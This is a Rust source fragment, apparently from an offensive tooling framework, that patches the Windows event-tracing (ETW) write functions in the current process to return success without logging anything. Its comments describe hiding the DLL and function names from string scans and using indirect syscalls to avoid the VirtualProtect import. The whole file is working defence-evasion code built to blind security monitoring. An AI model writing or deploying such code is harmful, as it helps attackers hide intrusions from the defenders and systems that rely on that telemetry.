// --- ETW patch (technique fragment) ---

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows::Win32::System::Threading::GetCurrentProcess;

/// `xor eax, eax; ret`: returns STATUS_SUCCESS (0) and never writes an event.
/// Written over the prologue of the event-writing exports.
const ETW_PATCH: [u8; 3] = [0x33, 0xC0, 0xC3];

/// Whether to also patch the Full variant (best effort).
const PATCH_FULL: bool = $PATCH_FULL$;

/// Errors produced while patching an event-writing function.
#[derive(Debug, thiserror::Error)]
pub enum PatchEtwError {
    #[error("failed to load the library to patch")]
    LoadFailed,
    #[error("failed to resolve the function to patch")]
    ResolveFailed,
    #[error("failed to make the target function writable")]
    MakeWritableFailed,
    #[error("failed to restore the target function protection")]
    RestoreProtectionFailed,
}

/// Patches the event-writing exports in the current process so no events reach
/// their consumers.
///
/// The main export failing aborts the preparation; the Full variant is best
/// effort, because some Windows builds do not export it and a missing secondary
/// export must not discard a working main patch.
///
/// The DLL and function names are substituted at build time by
/// `Params::render_fragment` with code that rebuilds them at runtime, so they
/// do not appear in `strings`. The page protection changes go through the
/// syscall layer's `nt_protect_vm`, so `mode: indirect` removes the
/// `VirtualProtect` import.
pub fn patch_etw() -> Result<bool, PatchEtwError> {
    patch_export(&$ETW_DLL_DEF$, &$ETW_FUNC_DEF$)?;
    if PATCH_FULL {
        if let Err(error) = patch_export(&$ETW_DLL_DEF$, &$ETW_FULL_FUNC_DEF$) {
            crate::tech_dbg!("patch_etw", "optional full variant skipped: {error}");
        }
    }
    // A Preparation always continues the pipeline; only the `bouncer` gate
    // decides to abort (see `techniques/README.md`).
    Ok(true)
}

/// Resolves `func` in `dll` and overwrites its prologue with [`ETW_PATCH`].
fn patch_export(dll: &str, func: &str) -> Result<(), PatchEtwError> {
    let dll = std::ffi::CString::new(dll).map_err(|_| PatchEtwError::LoadFailed)?;
    let func = std::ffi::CString::new(func).map_err(|_| PatchEtwError::LoadFailed)?;

    // The library is already loaded, so this only fetches its handle.
    let module = unsafe { LoadLibraryA(PCSTR(dll.as_ptr() as *const u8)) }
        .map_err(|_| PatchEtwError::LoadFailed)?;
    let address = unsafe { GetProcAddress(module, PCSTR(func.as_ptr() as *const u8)) }
        .ok_or(PatchEtwError::ResolveFailed)?;
    let target = address as usize as *mut u8;

    // Make the first bytes writable.
    let mut old_protect = 0u32;
    let status = crate::nt_protect_vm(
        unsafe { GetCurrentProcess() },
        target as *mut core::ffi::c_void,
        ETW_PATCH.len(),
        PAGE_EXECUTE_READWRITE.0,
        &mut old_protect,
    );
    if status < 0 {
        return Err(PatchEtwError::MakeWritableFailed);
    }

    // Write the patch.
    unsafe {
        for (i, byte) in ETW_PATCH.iter().enumerate() {
            *target.add(i) = *byte;
        }
    }

    // Restore the original protection.
    let status = crate::nt_protect_vm(
        unsafe { GetCurrentProcess() },
        target as *mut core::ffi::c_void,
        ETW_PATCH.len(),
        old_protect,
        &mut old_protect,
    );
    if status < 0 {
        return Err(PatchEtwError::RestoreProtectionFailed);
    }
    crate::tech_dbg!("patch_etw", "patched {dll}!{func} at {target:p}");

    Ok(())
}
